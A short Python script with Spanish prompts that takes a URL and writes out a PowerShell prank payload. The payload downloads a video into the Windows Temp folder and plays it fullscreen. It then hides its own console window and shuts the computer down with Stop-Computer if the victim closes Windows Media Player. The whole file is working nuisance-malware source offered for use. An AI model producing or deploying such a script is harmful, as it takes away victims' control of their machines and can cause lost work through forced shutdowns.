onedata = str('$clnt = new-object System.Net.WebClient\n$clnt | gm d*\n\n$url = "http://my.mixtape.moe/bzobfc.mp4"\n$file = "C:\\Windows\\Temp\\henneko.mp4"\n\nsleep 10\n\n$clnt.DownloadFile($url,$file)\n& "C:\Program Files\Windows Media Player\wmplayer.exe" "c:\Windows\\temp\\henneko.mp4" /fullscreen\n\nAdd-Type -Name Window -Namespace Console -MemberDefinition \' \n[DllImport("Kernel32.dll")]\npublic static extern IntPtr GetConsoleWindow();\n\n[DllImport("user32.dll")]\npublic static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);\n\'\nfunction Hide-Console\n{\n    $consolePtr = [Console.Window]::GetConsoleWindow()\n    #0 hide\n    [Console.Window]::ShowWindow($consolePtr, 0)\n}\nHide-Console\n\nFunction checkplayer{\n$ErrorOccured = $false\n\ntry \n{ \n   $ErrorActionPreference = \'Stop\'\nGet-Process wmplayer\n}\ncatch\n{\n   Stop-Computer\n   $ErrorOccured=$true\n}\n\nif(!$ErrorOccured) {"No Error Occured"}\n}\n\nfunction chepeat{\nsleep 10\ncheckplayer\nsleep 1\ncheckplayer\nsleep 1\ncheckplayer\nsleep 1\ncheckplayer\nsleep 1\n}\n\nchepeat')
print ("Usa http de ser posible")
link = str(input("Link a usar: "))

print (onedata.replace("http://my.mixtape.moe/bzobfc.mp4", link))

import sys
sys.stdout=open("hennekovidgetdepython.ps1","w")
print (onedata.replace("http://my.mixtape.moe/bzobfc.mp4", link))
sys.stdout.close()

f= open("hennekovidgetdepython.ps1","w+")
f.write(onedata.replace("http://my.mixtape.moe/bzobfc.mp4", link))
f.close()